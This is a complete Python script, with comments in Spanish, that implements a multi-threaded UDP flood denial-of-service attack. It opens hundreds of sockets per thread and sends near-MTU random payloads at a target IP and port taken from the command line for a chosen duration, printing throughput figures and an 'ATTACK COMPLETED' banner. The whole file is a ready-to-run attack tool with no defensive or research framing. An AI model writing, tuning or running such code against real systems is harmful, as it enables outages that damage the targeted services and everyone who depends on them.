import socket
import random
import sys
import time
import threading

def udp_raw_no_root(target_ip, target_port, duration):
    """UDP flood que simula comportamiento raw sin root"""
    
    # Crear múltiples sockets para simular raw
    sockets = []
    for _ in range(200):  # Muchos sockets para más potencia
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Configurar para máximo rendimiento
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sockets.append(sock)
        except:
            pass
    
    # Payloads grandes y variados
    large_payloads = [
        # Paquetes casi MTU (Maximum Transmission Unit)
        random._urandom(1470),  # Casi MTU IPv4
        random._urandom(1450),
        random._urandom(1400),
        random._urandom(1350),
        random._urandom(1300),
        
        # Datos con patrones
        b'\x00' * 1000 + random._urandom(400),
        b'\xFF' * 800 + random._urandom(600),
        b'\xAA' * 1200,
        b'\x55' * 1100,
        
        # Mix de datos
        random._urandom(1200) + b'\x00' * 200,
        b'\xFF' * 300 + random._urandom(1000),
    ]
    
    timeout = time.time() + duration
    packet_count = 0
    bytes_sent = 0
    
    print(f"[🔥] UDP RAW-LIKE FLOOD (No Root)")
    print(f"[🎯] Target: {target_ip}:{target_port}")
    print(f"[⏱️] Duration: {duration}s")
    print(f"[🔌] Active sockets: {len(sockets)}")
    print("[⚡] Sending maximum size packets...")
    
    start_time = time.time()
    
    while time.time() < timeout:
        try:
            # Usar todos los sockets para flooding masivo
            for sock in sockets:
                # Seleccionar payload grande
                payload = random.choice(large_payloads)
                
                # ENVÍO MASIVO - múltiples paquetes por socket
                for _ in range(random.randint(5, 20)):  # 5-20 paquetes por ciclo
                    sock.sendto(payload, (target_ip, target_port))
                    packet_count += 1
                    bytes_sent += len(payload)
                    
                    # Cambiar payload ocasionalmente
                    if random.random() < 0.3:
                        payload = random.choice(large_payloads)
            
            # Mostrar estadísticas cada 100k paquetes
            if packet_count % 100000 == 0:
                elapsed = time.time() - start_time
                mb_sent = bytes_sent / (1024 * 1024)
                mbps = (mb_sent * 8) / elapsed if elapsed > 0 else 0
                
                print(f"\r[📡] Packets: {packet_count:,} | MB: {mb_sent:.1f} | Speed: {mbps:.1f} Mbps | Sockets: {len(sockets)}", end="")
                
        except Exception as e:
            # Si hay error, recrear algunos sockets
            for _ in range(min(10, len(sockets))):
                try:
                    sock = sockets.pop()
                    sock.close()
                except:
                    pass
            
            for _ in range(10):
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    new_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sockets.append(new_sock)
                except:
                    pass
    
    # Cerrar todos los sockets
    for sock in sockets:
        try:
            sock.close()
        except:
            pass
    
    # Estadísticas finales
    total_time = time.time() - start_time
    mb_total = bytes_sent / (1024 * 1024)
    avg_mbps = (mb_total * 8) / total_time if total_time > 0 else 0
    
    print(f"\n\n[✅] ATTACK COMPLETED")
    print(f"[📊] Total packets: {packet_count:,}")
    print(f"[📊] Total data: {mb_total:.1f} MB")
    print(f"[📊] Average speed: {avg_mbps:.1f} Mbps")
    print(f"[📊] Packets/second: {packet_count/total_time:,.0f}")
    print("[💥] Maximum bandwidth achieved without root!")

def start_massive_flood(target_ip, target_port, duration):
    """Iniciar flooding masivo con múltiples threads"""
    
    print(f"[🚀] STARTING MASSIVE UDP FLOOD")
    print(f"[🎯] Target: {target_ip}:{target_port}")
    print(f"[⏱️] Duration: {duration}s")
    print(f"[👥] Launching attack threads...")
    
    threads = []
    num_threads = 5  # 5 threads deberían ser suficientes
    
    for i in range(num_threads):
        t = threading.Thread(target=udp_raw_no_root, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        threads.append(t)
        print(f"[{i+1}/{num_threads}] Thread started")
    
    # Esperar a que termine el tiempo
    time.sleep(duration)
    
    print(f"\n[✅] All threads completed!")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 udp_raw_noroot.py <ip> <port> <time>")
        print("Example: python3 udp_raw_noroot.py 192.168.1.1 80 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    start_massive_flood(target_ip, target_port, duration)
